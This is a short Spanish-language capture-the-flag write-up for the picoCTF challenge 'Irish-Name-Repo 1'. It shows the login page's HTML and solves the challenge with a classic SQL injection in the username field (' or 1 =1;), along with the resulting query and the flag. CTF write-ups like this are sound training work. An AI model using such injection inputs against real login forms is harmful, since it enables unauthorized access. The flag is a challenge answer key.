# Irish-Name-Repo 1
## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
## Pistas
P1:There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
P2:Try to think about how the website verifies your login.
## Datos de acceso al nivel
```bash
Usuario: Dena
Contraseña: Notedigo
```
## Solución
```bash
Pass siguiente lvl:
--------------------------------------------
|   |   |
|---|---|
||<!doctype html>|
||<html>|
||<head>|
||<title>Login</title>|
||<link rel="stylesheet" type="text/css" href="[//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css](https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css)">|
||</head>|
||<body>|
||<div class="container">|
||<div class="row">|
||<div class="col-md-12">|
||<div class="panel panel-primary" style="margin-top:50px">|
||<div class="panel-heading">|
||<h3 class="panel-title">Log In</h3>|
||</div>|
||<div class="panel-body">|
||<form action="login.php" method="POST">|
||<fieldset>|
||<div class="form-group">|
||<label for="username">Username:</label>|
||<input type="text" id="username" name="username" class="form-control">|
||</div>|
||<div class="form-group">|
||<label for="password">Password:</label>|
||<div class="controls">|
||<input type="password" id="password" name="password" class="form-control">|
||</div>|
||</div>|
||<input type="hidden" name="debug" value="0">|
|||
||<div class="form-actions">|
||<input type="submit" value="Login" class="btn btn-primary">|
||</div>|
||</fieldset>|
||</form>|
||</div>|
||</div>|
||</div>|
||</div>|
||</div>|
||</body>|
||</html>|
|||


username: ' or 1 =1;
password: holague
SQL query: SELECT * FROM users WHERE name='' or 1 =1;' AND password='holague'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}
```
## Notas Adicionales

| Comando  | Descripción | 
|------------|--------------|

## Referencias 
https://www.w3schools.com/sql/sql_injection.asp